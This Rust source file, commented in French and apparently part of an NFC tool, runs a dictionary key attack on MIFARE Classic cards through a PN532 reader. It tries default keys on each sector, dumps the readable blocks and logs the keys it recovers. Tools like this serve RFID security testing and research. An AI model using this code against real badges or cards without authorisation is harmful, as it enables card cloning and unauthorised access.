//! Attaques MIFARE Classic : dump par dictionnaire de clés.

use axolotl_core::{
    keys::DEFAULT_KEYS,
    layout::ClassicType,
    protocol::{MIFARE_AUTH_A, MIFARE_AUTH_B},
    MifareDump, NfcUid,
};

use super::Pn532;

const RE_SELECT_RETRIES: u8 = 5;

/// Clé trouvée pour un secteur pendant le dict attack.
#[derive(Clone, Copy)]
pub struct SectorKey {
    pub sector: u8,
    pub key_ab: u8, // 0 = KeyA, 1 = KeyB
    pub key: [u8; 6],
}

pub fn dump_all_sectors<F: FnMut(u8, u8)>(
    pn532: &mut Pn532,
    uid: &NfcUid,
    mut on_sector: F,
) -> (Box<MifareDump>, Vec<SectorKey>) {
    let card_type = ClassicType::from_sak(uid.sak).unwrap_or(ClassicType::Classic1K);
    let mut dump = Box::new(MifareDump::new(card_type));
    let uid4 = uid_to_4bytes(uid);
    let total = card_type.sector_count();

    log::info!("╔══════════════════════════════════════════╗");
    log::info!("║       MIFARE CLASSIC — DICT ATTACK       ║");
    log::info!("╠══════════════════════════════════════════╣");
    log::info!("║ UID  : {:02X}:{:02X}:{:02X}:{:02X}                      ║",
        uid.bytes[0], uid.bytes[1], uid.bytes[2], uid.bytes[3]);
    log::info!("║ SAK  : 0x{:02X}  ATQA: {:02X}{:02X}                  ║",
        uid.sak, uid.atqa[1], uid.atqa[0]);
    log::info!("║ Type : {:?}   {} sec   {} blocs         ║",
        card_type, total, card_type.block_count());
    log::info!("║ Dico : {} cles                           ║", DEFAULT_KEYS.len());
    log::info!("╚══════════════════════════════════════════╝");

    let mut found_sectors = 0u8;
    let mut found_keys: Vec<SectorKey> = Vec::new();

    for sector in 0..total {
        on_sector(sector, total);
        let trailer = card_type.sector_trailer(sector).unwrap();

        log::info!("┌─ Secteur {:02}/{} ───────────────────────────", sector, total - 1);

        if try_sector(pn532, &mut dump, sector, trailer, &uid4, &mut found_keys) {
            found_sectors += 1;
        } else {
            log::warn!("└─ Secteur {:02}: ECHEC — aucune cle valide", sector);
        }
    }

    let readable = dump.readable_count();
    let total_blocks = dump.total_blocks();

    log::info!("╔══════════════════════════════════════════╗");
    log::info!("║              DUMP TERMINE                ║");
    log::info!("╠══════════════════════════════════════════╣");
    log::info!("║ Secteurs lus : {:02}/{:02}                      ║", found_sectors, total);
    log::info!("║ Blocs lus    : {:03}/{:03}                     ║", readable, total_blocks);
    log::info!("╚══════════════════════════════════════════╝");

    (dump, found_keys)
}

fn try_sector(
    pn532: &mut Pn532,
    dump: &mut MifareDump,
    sector: u8,
    trailer: u8,
    uid4: &[u8; 4],
    found_keys: &mut Vec<SectorKey>,
) -> bool {
    let n = DEFAULT_KEYS.len();

    // ── KeyA ──────────────────────────────────────────────────────────────
    log::info!("│ [KeyA] bloc trailer={:03}", trailer);
    for (i, key) in DEFAULT_KEYS.iter().enumerate() {
        let ok = pn532.mifare_auth(trailer, MIFARE_AUTH_A, key, uid4).is_ok();
        log::info!(
            "│  A [{:02}/{}] {:02X}{:02X}{:02X}{:02X}{:02X}{:02X} → {}",
            i + 1, n,
            key[0], key[1], key[2], key[3], key[4], key[5],
            if ok { "OK ✓" } else { "FAIL" }
        );
        if ok {
            log::info!("│  *** KeyA trouvee! Lecture du secteur {:02}... ***", sector);
            found_keys.push(SectorKey { sector, key_ab: 0, key: *key });
            read_sector_blocks(pn532, dump, sector);
            log::info!("└─ Secteur {:02}: OK ({} blocs)", sector, dump_sector_block_count(dump, sector));
            return true;
        }
        if !re_select_with_retry(pn532) {
            log::warn!("│  Carte perdue apres {} tentatives re_select", RE_SELECT_RETRIES);
            return false;
        }
    }

    // ── KeyB ──────────────────────────────────────────────────────────────
    log::info!("│ [KeyB] bloc trailer={:03}", trailer);
    for (i, key) in DEFAULT_KEYS.iter().enumerate() {
        let ok = pn532.mifare_auth(trailer, MIFARE_AUTH_B, key, uid4).is_ok();
        log::info!(
            "│  B [{:02}/{}] {:02X}{:02X}{:02X}{:02X}{:02X}{:02X} → {}",
            i + 1, n,
            key[0], key[1], key[2], key[3], key[4], key[5],
            if ok { "OK ✓" } else { "FAIL" }
        );
        if ok {
            log::info!("│  *** KeyB trouvee! Lecture du secteur {:02}... ***", sector);
            found_keys.push(SectorKey { sector, key_ab: 1, key: *key });
            read_sector_blocks(pn532, dump, sector);
            log::info!("└─ Secteur {:02}: OK ({} blocs)", sector, dump_sector_block_count(dump, sector));
            return true;
        }
        if !re_select_with_retry(pn532) {
            log::warn!("│  Carte perdue apres {} tentatives re_select", RE_SELECT_RETRIES);
            return false;
        }
    }

    false
}

fn re_select_with_retry(pn532: &mut Pn532) -> bool {
    for attempt in 0..RE_SELECT_RETRIES {
        if pn532.re_select() {
            return true;
        }
        log::debug!("re_select {}/{} echouee", attempt + 1, RE_SELECT_RETRIES);
    }
    log::warn!("re_select: carte hors champ apres {} essais", RE_SELECT_RETRIES);
    false
}

fn read_sector_blocks(pn532: &mut Pn532, dump: &mut MifareDump, sector: u8) {
    let card_type = dump.card_type;
    let first = match card_type.sector_first_block(sector) {
        Some(b) => b,
        None => return,
    };
    let count = card_type.sector_block_count(sector);
    for i in 0..count {
        let block = first + i;
        let idx = block as usize;
        match pn532.mifare_read_block(block) {
            Ok(data) => {
                dump.blocks[idx] = data;
                dump.readable[idx] = true;
                log::info!(
                    "│  BLK {:03}: {:02X} {:02X} {:02X} {:02X}  {:02X} {:02X} {:02X} {:02X}  {:02X} {:02X} {:02X} {:02X}  {:02X} {:02X} {:02X} {:02X}",
                    block,
                    data[0],  data[1],  data[2],  data[3],
                    data[4],  data[5],  data[6],  data[7],
                    data[8],  data[9],  data[10], data[11],
                    data[12], data[13], data[14], data[15]
                );
            }
            Err(e) => {
                log::warn!("│  BLK {:03}: ERREUR {:?}", block, e);
            }
        }
    }
}

fn dump_sector_block_count(dump: &MifareDump, sector: u8) -> u8 {
    let card_type = dump.card_type;
    let first = card_type.sector_first_block(sector).unwrap_or(0) as usize;
    let count = card_type.sector_block_count(sector) as usize;
    dump.readable[first..first + count].iter().filter(|&&r| r).count() as u8
}

fn uid_to_4bytes(uid: &NfcUid) -> [u8; 4] {
    [
        uid.bytes.get(0).copied().unwrap_or(0),
        uid.bytes.get(1).copied().unwrap_or(0),
        uid.bytes.get(2).copied().unwrap_or(0),
        uid.bytes.get(3).copied().unwrap_or(0),
    ]
}
